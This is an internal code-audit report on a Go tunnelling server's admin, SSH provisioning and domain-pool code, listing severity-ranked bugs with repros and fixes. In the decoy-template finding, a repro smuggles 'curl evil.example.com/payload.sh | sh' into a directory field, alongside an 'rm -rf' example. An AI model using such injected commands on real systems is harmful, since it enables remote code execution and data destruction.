# T3 — Server + Integration Audit (2026-05-03)

**Scope:** server runtime + admin integration + SSH provisioning + multi-domain pool
**Baseline sha:** 7c8e99d6 (pl1 deployed binary, 2026-05-03)
**Auditor:** track T3 of final audit, baseline-diff против фаз 1/2/3 + may-audit P0/P1/P2 + bypass+coldstart

## Executive Summary

- **New findings:** 1× P0, 4× P1, 5× P2, 4× P3
- **Regressions:** none
- **Verified holding:** 12 baseline closures (B1 nginx flock, A1 backoff clamp, A2 X-SL-RL, A3-S-HIGH-2 WSAttached, A3-S-HIGH-3 dialCtx, A3-I-HIGH-1/2/3/4/5, A4-M2/M5, C2 ClientID exemption, C9 RunDone, C10 M2 newborn-orphan, C11.2/C11.3 publish ordering)

P0 finding (`RotateAppSecret` schema-code mismatch on `cf_api_token_enc`) blocks the documented APP_ENCRYPTION_KEY rotation workflow at first invocation. Several MEDIUM concurrency findings are race-only on rare timings and largely covered by deferred clean-up — none change pl1 steady-state behaviour. Top recommendations:

1. Rename column or rotate-list to align (`cf_api_token` ↔ `cf_api_token_enc`) — see P0.
2. Add `validateSourceDir` for decoy templates (P1) — closes a super-admin command-injection vector that bypasses audit detail.
3. Bind WS dial-goroutines to `runWebSocketSession.done` channel (P1) — eliminates 10 s SafeDial leak per orphaned upgrade.
4. Serialise `DisableLiveBlog` DB write under `lockServer` to remove DB-vs-SSH inconsistency window (P1).

---

## New Findings

### P0 — RotateAppSecret targets non-existent column `cf_api_token_enc`

- **Files:** `internal/admin/shadowlink_token_rotation.go:53`; `migrations/072_shadowlink_domain_pool.sql:12`; `internal/admin/shadowlink_pool_models.go:334`.
- **What:** `rotateColumns` declares `{table: "shadowlink_pool_servers", idCol: "id", dataCol: "cf_api_token_enc"}`, but the production schema (migration 072) created the column as `cf_api_token`. `getShadowLinkPoolServerCFToken` correctly reads from `cf_api_token`. There is no `ALTER TABLE ... RENAME COLUMN` migration in `072..077`. Tests in `shadowlink_token_rotation_test.go:191/271` create their own sqlite shim with the literal `cf_api_token_enc` so the bug never surfaces under `go test`.
- **Repro:** super_admin POSTs `/api/admin/security/rotate-encryption-key`. First iteration of the for-loop runs `SELECT id, cf_api_token_enc FROM shadowlink_pool_servers ...` → `pq: column "cf_api_token_enc" does not exist`. `RotateAppSecret` returns the wrapped error from `db.QueryContext`; only `ssh_password_enc` (the second `rotateColumn`) might still rotate, but the helper aborts before reaching it (line 86 `return report, fmt.Errorf("query %s.%s: %w", ...)`).
- **Impact:**
  1. Documented `APP_ENCRYPTION_KEY` rotation workflow (rotation comment lines 21-27) is **broken end-to-end**. Operator who follows the runbook gets a 500 with the SQL error and no rotation happens.
  2. After failed rotation the operator may still remove `APP_ENCRYPTION_KEY_PREVIOUS` from env (workflow step 5) → all CF tokens become un-decryptable on next provision.
  3. A regression-test gap: rotation tests assert plaintext round-trips on a fixture schema that diverges from production.
- **Mitigation idea:** option A (preferred) — rename code reference to `cf_api_token` in `rotateColumns` (and update sqlite shim columns in tests). Option B — add migration 078 `ALTER TABLE shadowlink_pool_servers RENAME COLUMN cf_api_token TO cf_api_token_enc`. Option A is a one-line fix that ships immediately; option B aligns schema with the audit-log convention used by `ssh_password_enc`. Either way, add a CI guard that asserts `rotateColumns` table+column tuples exist via a trivial PG query at startup, otherwise fail fast.

### P1 — `installDecoyTemplate`: shell injection via admin-supplied `source_dir`

- **Files:** `internal/admin/shadowlink_pool_decoy_templates_handlers.go:32-46`; `internal/deploy/steps_shadowlink_domain.go:121-137`.
- **What:** `CreateShadowLinkPoolDecoyTemplate` accepts `source_dir` as a free-form JSON string and writes it to DB without validation. `InstallDecoyTemplate` validates `templateName` via `decoyTemplateNameRe` (regex anchored, lowercase alphanumeric/dash/underscore) but does **not** validate `sourceDirOnServer`. Both values are interpolated into a single shell command via `fmt.Sprintf("mkdir -p %s && rsync -a --delete %s/ %s/", dstPath, sourceDirOnServer, dstPath)` and executed via `mgr.ExecuteCommandWithTimeout`.
- **Repro:** super-admin creates a template with `source_dir` set to `"/tmp/foo; curl evil.example.com/payload.sh | sh; #"`. Subsequent domain provision step 7 fires `mkdir -p /var/www/decoy/foo && rsync -a --delete /tmp/foo; curl evil.example.com/payload.sh | sh; #/ /var/www/decoy/foo/`. The bash interpreter on the pool server splits on `;` and runs the curl/sh.
- **Impact:** RCE on every pool server that provisions a domain bound to the malicious template. Audit-log records show only the template name, not the body of the malicious shell — `LogFromContext` at line 42-46 only records `name`/`source_dir`/`is_dynamic`, but the audit `details` map stores the offending `source_dir` so detection is possible; nothing prevents the attacker from masking it as `/var/www/legacy && rm -rf /var/www/decoy`. **Severity:** P1 because (a) attacker must have super_admin role (which already trusts deploy operations), but (b) audit-detail review usually focuses on the template `name` and would let an injection slip through; (c) `decoyTemplateNameRe` was added precisely to defend against this same class on the sibling parameter — leaving `sourceDirOnServer` un-validated is an inconsistency.
- **Mitigation idea:** add `sourceDirRe = regexp.MustCompile(\`^/[A-Za-z0-9_./-]{1,200}$\`)` and reject inside `InstallDecoyTemplate` — and in the handler `CreateShadowLinkPoolDecoyTemplate` so the bad row never lands in DB. Alternative: switch to `mgr.WriteToRemoteFile`-driven sftp + a server-side script that takes `templateName` only, dropping per-row `source_dir` from the wire (templates would live in a fixed catalog).

### P1 — WS CONNECT dial goroutine not bound to `runWebSocketSession.done`

- **File:** `shadowlink/server/websocket.go:498-580`, specifically `SafeDial(context.Background(), tgt, 10*time.Second)` at line 522.
- **What:** Each `core.FlagConnect` chunk spawns an unbounded async dial goroutine. The goroutine registers a `pendingStream` in `streams[streamID]`, then runs `SafeDial` with `context.Background()` and a 10 s timeout. Unlike the parallel POST path (`handler.go:1225` which derives `dialCtx` from `tunnel.done`), this dial **is not cancelable** when the parent WS reader/writer goroutine exits. If the client disconnects (or the `done` channel closes via `closeDone()`) during the 10 s SafeDial window, the dial keeps running to completion.
- **Repro:** client opens WS, sends a `FlagConnect` to a target IP that black-holes SYN packets (e.g. firewall drop). 1–2 ms after sending CONNECT the client closes the WS. The reader goroutine exits on `conn.ReadMessage` returning EOF, `closeDone()` fires; the dial goroutine still sits in the kernel SYN backoff for the full 10 s budget plus retransmit chain.
- **Impact:** under cold-start cascade conditions (8-slot WS pool reconnect storm), each rejected upgrade may have already spawned a dial goroutine that lives for ~10 s past the connection close. With pool=6 × N retries × 10 s leak you get ≈60 dial goroutines per client per minute, plus their TCP socket descriptors. Doesn't break correctness but inflates `runtime.NumGoroutine` and FD counts for slow targets, and complicates cancellation reasoning. The `streamsMu` is also acquired by these goroutines after the parent select loop has exited — they then `delete(streams, sid)` from a now-dereferenced map (still safe; map is not nil because Go GC keeps it alive while a reference exists).
- **Mitigation idea:** thread `done <-chan struct{}` into the goroutine closure, build `dialCtx, cancelDial := context.WithCancel(context.Background())`, run a watcher `go func(){ select { case <-done: cancelDial(); case <-dialCtx.Done() } }()` analogous to `handler.go:1227-1233`. After dial returns, also test `select { case <-done: ... close target conn ...; default: ... activate stream ... }` to avoid wiring CONNECT_OK into a dead WS.

### P1 — `DisableLiveBlog` writes DB before acquiring per-server lock; lacks `markDeploying` ordering

- **File:** `internal/admin/shadowlink_handlers.go:1889-1942`.
- **What:** order of operations is (1) read cfg from DB, (2) flip `Enabled=false` in struct, (3) `db.Exec(UPDATE … config_json=$1)` at line 1920 (no lock held), (4) `markDeploying(serverID)` at line 1925, (5) spawn goroutine that takes `lockServer` and runs `runApplyLiveBlog`. The DB UPDATE at step 3 happens **before** any in-process lock is held and before the goroutine takes `applyMutex`.
- **Repro:**
  - Two concurrent operators submit `DisableLiveBlog` for the same server. Both pass the `db.QueryRow` select (step 1) and `db.Exec` UPDATE (step 3). Operator A's `markDeploying` succeeds and spawns a goroutine; Operator B's `markDeploying` returns `alreadyRunning=true`, the handler returns 409. **Operator B has already committed a DB UPDATE**; the SSH apply that would push the YAML to match the new DB state is rejected. DB now claims `enabled=false` but server YAML still has `enabled=true` until the in-flight goroutine of Operator A finishes — and Operator B is told the operation failed.
  - More pernicious: an in-flight `ApplyLiveBlog` goroutine (started a moment earlier, holding `lockServer`) is reading `cfg` from DB, rendering YAML, and pushing via SSH. Concurrently `DisableLiveBlog` UPDATEs DB to `enabled=false`. The Apply goroutine has already serialised the old `enabled=true` config into yaml content before the UPDATE landed — it pushes that yaml with SSH and updates `applied_at` (line 1316), so the SSH state is `enabled=true` and DB state is `enabled=false`. The next probe / restart would re-render from DB and converge, but ops dashboards show inconsistency for several minutes.
- **Impact:** observable DB↔SSH state drift on race; 409 responses to valid concurrent disables; no audit-log distinguishes the success case (Apply goroutine actually ran SSH) from the silent-failure case (DB UPDATE without SSH). Additionally `runApplyLiveBlog` does not re-validate `cfg.Domain` (line 1284-1321), so a bad domain that slipped past `MigrateToYAML`/`ApplyLiveBlog` validation flows to `renderShadowLinkConfigYAML` and onto the wire — but since `runApplyLiveBlog` only calls `shadowlink-apply-config.sh` (not nginx), this is mostly cosmetic.
- **Mitigation idea:** swap order to `lockServer → re-read cfg under lock → UPDATE → spawn goroutine with the same lock` (handing the locked mutex into the goroutine via a closure or by re-acquiring under a different naming). Simpler: do not write DB in the synchronous handler at all — let the goroutine do `cfg.LiveBlog.Enabled=false; UPDATE protocol_configs ...; runApplyLiveBlog(...)` while holding the lock, mirror the `MigrateToYAML` pattern (transaction across SSH push). Add `validateShadowLinkDomain(cfg.Domain)` to `runApplyLiveBlog` for defence-in-depth.

### P1 — `DeleteShadowLinkPoolDomain` does not gate against in-flight `provisionDomain`

- **Files:** `internal/admin/shadowlink_pool_domains_handlers.go:102-159`; `internal/admin/shadowlink_domain_provision.go:286-343`.
- **What:** the DELETE handler immediately runs `deleteShadowLinkPoolDomain` (DB row delete) and fires a goroutine that deletes the CF DNS record. The provisioning orchestrator for the same `domain_id` may still be running. After step 7 (decoy install) it acquires the per-server lock and runs `listDomains → uploadNginxConfig → reloadNginx → rewriteDomainDecoyMapBlock → reloadShadowLink → setStatus(active)`. If the DELETE lands inside that critical section:
  1. `listDomains` (line 293) returns the domain row — orchestrator pushes nginx config that **includes the deleted domain** (because `listDomains` was already evaluated before the DELETE).
  2. CF DNS record is deleted by the DELETE-side goroutine while orchestrator's nginx config still references the domain.
  3. `setStatus(active)` is run against a non-existent row — silent no-op.
  4. Until the next provision/probe sweep, nginx and shadowlink config diverge from DB.
- **Repro:** create domain X (CF zone takes ~10 s to confirm, then SSH steps run ~30 s). During the SSH segment, DELETE `/api/admin/shadowlink/pool/.../domains/X`. Orchestrator finishes after DELETE, leaving X in nginx config but absent from DB.
- **Impact:** temporary DNS / nginx / config inconsistency on race. Self-heals on next provision call. Logs at line 357 will report DONE despite the actual state being inconsistent.
- **Mitigation idea:** make DELETE acquire `acquireServerProvisionLock(slServerID)` before the DB delete, so it serialises with steps 8-11 of the in-flight orchestrator. After DELETE the next provision (or a one-shot reconcile) will rebuild nginx without X. Alternative: orchestrator re-reads the domain row right before step 8 and aborts if it has been deleted.

### P2 — `handleDataChunk` holds `stream.mu` across blocking target Write

- **File:** `shadowlink/server/handler.go:786-812`.
- **What:** the multiplexed branch acquires `stream.mu.Lock()` (line 800), checks `stream.TargetConn != nil`, and calls `stream.TargetConn.Write(data)` while still holding the lock (line 802). If the target TCP connection is slow to drain (kernel send buffer full), this blocks under the lock. Concurrent senders to the same `streamID` (rare but possible after a CONNECT_OK race) and the `handleStreamFin` cleanup (which only takes `tunnel.mu`, not `stream.mu`) are unaffected, but `relayStreamFromTarget` reads do not hold `stream.mu` — so this is mostly a single-writer per stream, single-reader pattern. The pathological case is when a malicious or congested target stalls Write for the full 60 s `streamWriteTimeout`; another goroutine that needs `stream.mu` to flush `PendingBuf` (line 1257-1261 in `handleConnect`) blocks for the duration. Activate runs only once per stream, so it can race only with the **first** data chunk after CONNECT_OK — small attack surface, but the lock-during-IO pattern is a smell.
- **Repro:** target host `192.0.2.1:80` (TEST-NET, blackholes traffic). Client sends FlagConnect on streamID=1, then immediately several FlagData. The reader goroutine on the server side runs `Activate` while at the same moment another POST tries to Write to the same stream → mutex contention. Not a leak, just lock-during-IO.
- **Impact:** worst-case 60 s lock hold under malicious target; under normal CDN+nginx loopback this is unobservable.
- **Mitigation idea:** copy the `TargetConn` pointer under lock, release, then call `Write` on the local copy. Mirrors the WS path's `wsStream.Write` (line 231-254), which buffers via channel (so the lock-during-IO is only on `pendingBuf` mutation).

### P2 — `runDeployingEvictor` has no defer-recover; one panic kills the gate's TTL safety net

- **File:** `internal/admin/shadowlink_handlers.go:122-133`.
- **What:** the eviction goroutine spawned in `NewShadowLinkHandler` runs `evictStaleDeploying(now, maxAge)` once per minute. If the call panics (e.g. `Range` callback bug, or future code change that dereferences nil), the goroutine exits and the evictor stops running. Subsequent stuck `deploying` entries (from a panic that escapes the deferred Delete in `runDeploy`/`runMigrateToYAML`/etc.) remain forever, locking out that server.
- **Repro:** synthetic — inject a panic into `evictStaleDeploying` via test fixture; goroutine exits silently; `markDeploying` for that server returns true forever after a stale insert.
- **Impact:** correctness intact under happy paths; defence-in-depth lost under a future bug. Severity P2 because the only known panic surface is `value.(time.Time)` type assertion which is already guarded (line 142-148) via `ok` check.
- **Mitigation idea:** wrap the body of `runDeployingEvictor` in `defer func() { if r := recover(); r != nil { slog.Error("evictor panic, restarting", "panic", r); go h.runDeployingEvictor(interval, maxAge) } }()` — auto-restart on panic. Or: add a wrapper that runs evictStaleDeploying in a fresh recover-protected goroutine each tick so the parent loop never dies.

### P2 — `probeFailCounter` orphan-entry leak after domain delete

- **File:** `internal/admin/shadowlink_pool_probe_scheduler.go:39-58, 178-247`.
- **What:** `probeFailCounter` is a package-private `map[int64]int` keyed by `domain_id`. Entries are inserted on probe failure (line 198), deleted on success (line 181) or threshold-hit (line 232). When a domain is **deleted** from DB while it has a counter entry, no code path ever cleans the map — the next sweep skips the domain (it's not in `selectActiveDomainsForProbe`), so the counter entry sits forever.
- **Repro:** create+probe-fail domain X 1× (counter[X]=1), DELETE X. The map still holds key X. Repeat 10⁵ times → map has 10⁵ orphan entries. No memory pressure for years, but unbounded.
- **Impact:** slow memory leak; trivially addressable. No correctness issue (the orphan entry stays at count<3, and a domain ID is never reused because PG BIGSERIAL).
- **Mitigation idea:** delete from the counter at the start of each sweep using set-difference between observed-domains-in-sweep and counter keys. Or in `DeleteShadowLinkPoolDomain` add `probeFailCounterDelete(id)` (would need to be exported / pkg-friend).

### P2 — `runOnce` probe sweep is single-threaded; sustained 10 s timeouts can saturate the interval

- **File:** `internal/admin/shadowlink_pool_probe_scheduler.go:94-115, 65-91`.
- **What:** for each domain, sweep does `probeOne(ctx, db, httpClient, d)` sequentially. With N domains × 10 s timeout the worst case is N×10 s. Comment at line 84 claims `4 мин budget`, but for 30 domains the actual ceiling is 5 min == `probeSweepInterval`. The `ticker.Reset(probeSweepInterval)` at line 84 keeps things spaced **after** sweep, but it means a sustained outage doubles the effective interval (5 min sweep + 5 min wait → 10 min).
- **Repro:** simulate 30 domains all timing out (block port 443 outbound). Sweep takes ~300 s. Next sweep starts ~600 s after the first.
- **Impact:** delayed detection of recovery; status counters undercount until the next sweep. Not a correctness bug.
- **Mitigation idea:** parallelise sweep with a small `errgroup.Group{}.SetLimit(8)` similar to `BroadcastStreamClose`. With limit=8 and 30 domains × 10 s the worst case shrinks to 40 s.

### P2 — `live_blog` canary loop uses `context.Background()` for upstream fetch logging

- **File:** `shadowlink/server/live_blog_canary.go:156`.
- **What:** the canary drift logger calls `slog.Log(context.Background(), level, ...)` instead of plumbing the canary loop's context. This is fine for the slog call (slog handler does not use ctx for cancellation), but it is a lint signal that nothing in this canary file owns a ctx-derived path. The canary loop itself derives `ctx` from a parent `cancel()` (handler.go:1837-1842), so the loop terminates correctly on shutdown — confirmed.
- **Repro:** N/A — defensive review.
- **Impact:** none today.
- **Mitigation idea:** thread the canary loop's `ctx` into the drift slog call for consistency.

### P3 — `RotateAppSecret` re-encrypts records currently under primary key (CPU churn)

- **File:** `internal/admin/shadowlink_token_rotation.go:104-148`.
- **What:** the rotation iterates every encrypted row and re-encrypts unconditionally. Records already encrypted with the new key are decrypted and re-encrypted with a fresh GCM nonce, generating noise in `report.Rotated`. Operator workflow assumes "Rotated == number of records still on the old key", which is **wrong** after a second rotation pass.
- **Repro:** call `RotateAppSecret` twice in a row. Both calls report identical Rotated counts.
- **Impact:** observability / docs mismatch; not a correctness issue.
- **Mitigation idea:** detect "already on new key" via a versioned tag inside ciphertext (the `v1.` prefix already exists, but doesn't distinguish current vs previous key); or accept the churn and document it.

### P3 — `evictStaleDeploying` does not log the absolute eviction count after the loop

- **File:** `internal/admin/shadowlink_handlers.go:138-160`.
- **What:** logs each eviction at WARN level (line 154) but not the aggregate. With many stuck gates, ops sees N WARN lines but no structured "X gates evicted at <time>" summary that downstream alerting can latch onto.
- **Mitigation idea:** add a single info log after the Range loop with the count (when non-zero).

### P3 — `runApplyLiveBlog` has no `cfg.Domain`/`apiIP` re-validation

- **File:** `internal/admin/shadowlink_handlers.go:1284-1321`.
- **What:** unlike `runMigrateToYAML` (line 1463-1468 + 1456-1461) and `ApplyLiveBlog` parent (line 355 + 365), `runApplyLiveBlog` re-applies the current `cfg` without re-validating `cfg.Domain` or `NIXAVPN_API_IP`. Today this is OK because both are only consumed by `renderShadowLinkConfigYAML` and `shadowlink-apply-config.sh` (no nginx rewrite). If a future patch adds nginx rewrite into this path, the missing validation becomes a A3-I-HIGH-3 regression.
- **Mitigation idea:** add the same `validateShadowLinkDomain(cfg.Domain)` defence-in-depth gate at the top of `runApplyLiveBlog`.

### P3 — `Tunnel.streams` map dereferenced from dial-goroutine after WS reader exit

- **File:** `shadowlink/server/websocket.go:494, 528-530, 558-560`.
- **What:** after `runWebSocketSession` returns and the parent goroutine drops `streams`, dial goroutines that are still running may write to `streams[streamID]` / `delete(streams, streamID)` under `streamsMu`. The map keeps living because the closure captured `streams` by reference; this is correct Go but masks future bugs (e.g. `streams = nil` assignment in cleanup would crash). Together with finding P1 (dial-goroutine leak), this is the systemic shape.
- **Mitigation idea:** binding to `done` (P1 mitigation) automatically narrows the lifetime — once `done` is closed, the dial goroutine cancels and never touches `streams` again.

---

## Regressions

None observed against the pl1 baseline. All listed baseline closures verified holding; see "Verified-Still-Closed" below.

---

## Verified-Still-Closed

- **B1 nginx race lock** — `internal/deploy/steps_shadowlink_domain.go:199-215` retains the `flock -w 25 /var/lock/shadowlink-nginx.lock -c '...'` script with backup/restore + `nginx -t` validation; combined with app-side `acquireServerProvisionLock` (`internal/admin/shadowlink_domain_provision.go:29-38`) per-server. Verified at sha 7c8e99d6.
- **A1 backoff overflow clamp** (client-side, out of T3 scope but referenced by may-audit-p0-done.md) — confirmed only via `ws_pool` references in this audit; not directly in T3 file set.
- **A2 X-SL-RL sentinel** — `shadowlink/server/decoy_timing.go:38-42` writes the verbose `bucket=...,burst_left=...,refill_in=...s,exempt=...` form; emitted from `handler.go:441-446/463-468/745-750` (handshake/data) and `websocket.go:328-334` (ws_upgrade). `RateLimitSentinelEmitted` counter ticks at line 133 of `decoy_timing.go`.
- **A3-S-HIGH-1 Content-Type discriminator** — `handler.go:292-303` `isJSONContentType` strips `;` params, case-insensitive prefix match.
- **A3-S-HIGH-2 WSAttached CAS gate** — `handler.go:101 atomic.Bool`, set in `websocket.go:107` via `CompareAndSwap(false, true)`, released in `websocket.go:361-368` defer.
- **A3-S-HIGH-3 dialCtx bound to tunnel.done** — `handler.go:1225-1233`. (P1 finding shows the WS variant is missing the same gate; this baseline applied only to the POST `handleConnect` path and is intact there.)
- **A3-I-HIGH-1 admin auditMiddleware** — `cmd/api/main.go:664` `slGroup := admin.Group("/shadowlink", correlationIDMW, shadowlinkAuditMW)`, sub-groups (`pool`, `bypass-cidrs`) inherit. Verified.
- **A3-I-HIGH-2 validateAPIIP** — `shadowlink_handlers.go:241` regex via `net.ParseIP`; called on `Deploy/MigrateToYAML/ApplyLiveBlog` paths.
- **A3-I-HIGH-3 validateShadowLinkDomain** — `shadowlink_handlers.go:219`; FQDN regex.
- **A3-I-HIGH-4 applyMutex per server** — `shadowlink_handlers.go:50, 190-195`; used in ApplyLiveBlog and DisableLiveBlog goroutines.
- **A3-I-HIGH-5 findShadowLinkBinary via os.Executable** — `shadowlink_handlers.go:1055-1060` honors the executable directory.
- **A3-I-MED-6 MigrateToYAML transaction wrap** — `shadowlink_handlers.go:1535-1685` BeginTx → tentative UPDATE → SSH push → Commit/Rollback.
- **A4-M2 deployingTimestamps eviction** — `shadowlink_handlers.go:48-49, 122-160`; `runDeployingEvictor` 60 s ticker, 10-min staleness window, idempotent `Shutdown()`.
- **A4-M5 closeTunnel idempotent + only `done`** — `handler.go:130-134` `closeOnce.Do(close(t.done))`; data channels not closed by closeTunnel (verified — `handler.go:111-129` doc + body).
- **C2 ClientID exemption (LRU 10k, TTL 1h, soft-cap 60/min)** — `clientid_exempt.go:35-94`, wired in `handler.go:188-205` (NewHandler) + `handler.go:427-449` (handshake escape hatch) + `handler.go:719-726` (data-path bypass without soft-cap). X1 Stage 2 follow-up (data-path soft-cap removed) confirmed at line 717.
- **C9 mirror RunDone in WS server-side** — `websocket.go:646-656`; `writer.Close(); <-writer.RunDone(); conn.Close()`.
- **C10 M2 newborn-orphan 30s eviction** — `handler.go:1742` `newbornOrphanMaxAge = 30s`, called from `StartCleanup` line 1793; `Session.AttachedAt` stamped in `websocket.go:116`. `OrphanSessionCleaned` counter at metrics.go:79.
- **C11.2 SetStatsCallbacks atomic publish** — out of T3 file scope (core/), referenced via `metrics.go` callbacks.
- **C11.3 MimicrySession publish-before-map** — `handler.go:572` references the SessionManager.Create-side change.
- **C14 strict 16-byte clientID decode** — out of T3 file scope (core/), referenced via `handler.go:428` DecryptClientID call.

---

## Operational Notes

- **Anti-deploy hazard #1 (P0):** do not run `POST /api/admin/security/rotate-encryption-key` until the cf_api_token column rename is fixed. The first call returns 500 + leaves the operator in mid-rotation state with `APP_ENCRYPTION_KEY_PREVIOUS` still required. Pending fix, document a manual psql migration step or take the route off the admin UI.
- **Anti-deploy hazard #2 (P1):** super-admins creating decoy templates must hand-validate `source_dir` until validation lands. The existing audit log records the field, so retro-detection is feasible — recommend a one-shot `SELECT id, source_dir FROM shadowlink_pool_decoy_templates WHERE source_dir ~ '[;&|<>` $\\\\\\`\\\\\\\\\\\\$()]'` review before next ship.
- **Runbook gap:** `RotateAppSecret` doc-comment (rotation.go:21-27) does not mention the column-name precondition; once P0 is fixed, add a verification step "`SELECT count(*) FROM shadowlink_pool_servers WHERE cf_api_token IS NOT NULL` matches Rotated+Failed".
- **Missing alert:** `shadowlink_orphan_session_cleaned_total` (C10 M2) is exposed but no alert rule references it. A persistent non-zero rate signals CF↔origin handshake-vs-WS-upgrade asymmetry; suggest WARN at >5/min sustained 5 min.
- **Probe sweep saturation alert:** P2 finding suggests adding "sweep_elapsed > probeSweepInterval/2" already logs WARN (`shadowlink_pool_probe_scheduler.go:85`); ops should latch on this signal as an early indicator before the sweep saturates the interval entirely.
- **Lock-during-IO smell:** P2 `handleDataChunk` is small impact today but pl1 should not run with malicious targets unless `BlockDomains` config catches them. `BlockDomains` config currently lives in YAML (`server/config.go:BlockDomains`) — ensure CI-deployed configs include the canonical block list (zero-config deploys don't apply any block).

---

## Open Questions

1. **Schema preference for P0 fix:** rename code reference (`cf_api_token`) vs. add migration 078 (`cf_api_token_enc`) — the latter aligns with the `_enc` convention used by `ssh_password_enc` and audit-log naming. Cost: one migration vs. one-line code change. Recommend rename code (zero migration risk) and a follow-up cleanup migration in a quieter cycle.
2. **WS dial-goroutine bound:** is there a customer-impact observation under cold-start cascade (8-slot pool reconnect) that demonstrates the leak in production telemetry, or is this purely defence-in-depth? If field metrics show stable goroutine count, P1 → P2.
3. **Decoy template source_dir validation surface:** should we also validate `is_dynamic=true` templates differently (live-decoy points at the path "live-decoy" without leading slash — current regex would need to allow relative paths). The existing seed (migration 072 line 38) `live-decoy` would fail a strict `^/...` regex.
4. **Probe sweep parallelism (P2):** tune limit=8 vs limit=4? Need a target steady-state per-pool throughput measurement before flipping.
5. **`probeFailCounter` cleanup point:** prefer event-driven (delete in `DeleteShadowLinkPoolDomain`) or periodic (set-difference in sweep)? Event-driven gives precision; periodic gives self-healing.
